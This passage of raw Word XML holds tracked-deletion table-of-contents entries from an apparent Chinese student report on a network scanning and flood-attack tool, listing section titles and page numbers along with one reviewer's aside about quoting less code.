        </w:rPr>
      </w:pPr>
      <w:ins w:id="409" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="410" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.</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详细设计</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>15</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="39C48966" w14:textId="4D1BD663" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="411" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="412" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="413" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="414" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.1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主机扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>15</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="43D7E652" w14:textId="07D0947F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="415" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="416" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="417" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="418" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.1.1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流程图</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>15</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4CABB094" w14:textId="58A0F8EC" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="419" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="420" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="421" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="422" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.1.2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主要数据</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>16</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="71A200F8" w14:textId="79467400" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="423" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="424" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="425" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="426" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.1.3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主要函数</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>17</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6F0C16D0" w14:textId="71B9FBE4" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="427" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="428" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="429" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="430" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.2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UDP端口扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>18</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3DD418FB" w14:textId="6BCC67D5" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="431" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="432" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="433" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="434" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.2.1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流程图</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>18</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0CCF32EC" w14:textId="44917586" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="435" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="436" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="437" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="438" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.2.2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主要数据</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>19</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="03E14421" w14:textId="29EB8E8F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="439" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="440" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="441" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="442" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.2.3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主要函数</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>20</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="73FF68E5" w14:textId="63DE2245" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="443" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="444" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="445" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="446" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.3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 Flood攻击</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>21</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28682143" w14:textId="4C7D5209" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="447" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="448" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="449" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="450" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.3.1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流程图</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>21</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3DD0DBC9" w14:textId="61EB0065" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="451" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="452" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="453" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="454" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.3.2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主要数据</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>21</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="108C7CB3" w14:textId="44F1381E" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="455" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="456" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="457" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="458" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.3.3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主要函数</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>23</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="789887DC" w14:textId="6ABA119D" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="459" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="460" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="461" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="462" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>4.4</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本章小结</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>24</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0EA102E7" w14:textId="54416534" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="463" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="464" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="465" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="466" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.</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程序实现(流程图属设计吧。不要引用大量代码，只引用部分关键代码。把这部分合并到第4章吧。参考张海阳的)</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>25</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="51F914AF" w14:textId="08046A40" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="467" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="468" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="469" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="470" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.1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主机扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>25</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B9B6353" w14:textId="71AD2B06" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="471" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="472" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="473" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="474" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.1.1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hostScan函数</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>25</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="733E5A9D" w14:textId="5BE3350C" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="475" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="476" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="477" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="478" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.1.2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ping函数</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>26</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3A2735B7" w14:textId="4B058C0A" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="479" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="480" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="481" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="482" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
